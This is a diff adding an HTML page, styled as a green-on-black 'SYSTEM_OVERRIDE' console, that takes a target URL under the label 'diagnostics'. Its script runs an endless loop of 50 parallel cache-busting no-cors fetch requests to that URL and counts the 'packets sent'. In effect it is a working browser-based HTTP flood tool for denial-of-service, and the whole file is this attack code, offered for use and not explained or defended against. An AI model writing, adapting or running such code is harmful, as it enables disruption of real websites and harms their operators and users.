@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Console Interface v3.1</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; }
+        #terminal { width: 80%; margin: 50px auto; border: 2px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
+        input { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 60%; margin: 10px; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff0000; color: #fff; }
+        #stats { font-size: 1.5em; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div id="terminal">
+        <h1>SYSTEM_OVERRIDE_INITIATED</h1>
+        <p>ENTER TARGET URL TO START DIAGNOSTICS</p>
+        <input type="text" id="target" value="https://">
+        <br>
+        <button id="fireBtn" onclick="run()">ACTIVATE</button>
+        <div id="stats">PACKETS SENT: <span id="counter">0</span></div>
+    </div>
+
+    <script>
+        let active = false;
+        let total = 0;
+        function run() {
+            if (active) { active = false; document.getElementById('fireBtn').innerText = 'ACTIVATE'; return; }
+            const addr = document.getElementById('target').value;
+            if (!addr.startsWith('http')) return alert('URLを入力してください');
+            active = true;
+            document.getElementById('fireBtn').innerText = 'DEACTIVATE';
+            attack(addr);
+        }
+        async function attack(url) {
+            while (active) {
+                // 同時に50発の並列リクエストを生成
+                const burst = Array.from({ length: 50 }, () => 
+                    fetch(`${url}?z=${Math.random().toString(36)}`, { mode: 'no-cors', cache: 'no-store' })
+                );
+                await Promise.allSettled(burst);
+                total += 50;
+                document.getElementById('counter').innerText = total;
+            }
+        }
+    </script>
+</body>
+</html>
